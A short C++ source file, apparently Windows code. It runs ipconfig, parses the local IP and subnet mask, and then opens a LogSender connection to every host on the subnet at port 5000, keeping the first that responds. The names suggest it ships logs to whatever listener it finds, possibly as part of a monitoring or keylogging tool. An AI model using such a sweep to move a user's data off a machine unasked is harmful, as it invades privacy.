#include "LogSender.hpp"
#include <stdlib.h>
#include <string>
#include <stdio.h>
#include <io.h>
#include <fstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <math.h>

using namespace std;

void read_ip_info(const char * filename, string * ipInfo) {
    ifstream f(filename);

    string buffer;

    while (buffer != "Wi-Fi") {
        f >> buffer;
    }

    while (buffer != "IPv4") {
        f >> buffer;
    }

    for (int i = 0; i < 13; i++) {
        f >> buffer;
    }

    ipInfo[0] = buffer;

    for (int i = 0; i < 15; i++) {
        f >> buffer;
    }

    ipInfo[1] = buffer;

    f.close();
}

string get_ip_from_decimal(unsigned long ip) {
    string result;

    for (int c = 0; c < 4; c++) {
        int buffer = 0, j = 0;
    
        for (int i = 0; i < 8 && ip > 0; i++) {
            buffer += (ip % 2) * pow(2, i);

            ip /= 2;
            j++;
        }

        result = to_string(buffer) + "." + result;
    }

    result = result.substr(0, result.length() - 1);

    return result;
}

SOCKET sock_arr [254];

void send_file(SOCKET ** ret_val) {

    system("c:\\windows\\system32\\ipconfig -all > ips.txt");

    //ipInfo[0] = ip address
    //ipInfo[1] = subnet mask
    string ipInfo[2];

    read_ip_info("ips.txt", ipInfo);

    int position = ipInfo[0].find("(Preferred)");

    ipInfo[0] = ipInfo[0].replace(position, ipInfo[0].length(), "");

    int c, d, e, f;

    sscanf(ipInfo[0].c_str(), "%d.%d.%d.%d", &c, &d, &e, &f);

    unsigned long ip = f + e*256 + d*256*256 + c*256*256*256;

    sscanf(ipInfo[1].c_str(), "%d.%d.%d.%d", &c, &d, &e, &f);

    unsigned long subnet_mask = f + e*256 + d*256*256 + c*256*256*256;

    unsigned long network_address = ip & subnet_mask;

    // 33 = 00000000 00000000 00000000 00100001

    int select_result = 0;
    SOCKET * sock;

    fd_set write_fds;
    FD_ZERO(&write_fds);

    for (int i = 0; i < 254; i++) {
        sockaddr_in addr;

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(get_ip_from_decimal(network_address).c_str());
        addr.sin_port = htons(5000);

        LogSender l(&addr);
        // threads[i] = thread(send_log, l, filename);

        sock_arr[i] = l.send_logs();;

        FD_SET(sock_arr[i], &write_fds);

        network_address += 1;
    }

    timeval timeout;

    timeout.tv_sec = 2;
    timeout.tv_usec = 0;

    select(0, NULL, &write_fds, NULL, &timeout);

    bool finish = false;

    while (!finish) {
        for (int i = 0; i < 254; i++) {
            if (FD_ISSET(sock_arr[i], &write_fds)) {
                *ret_val = &sock_arr[i];

                finish = true;
            }
        }
    }
}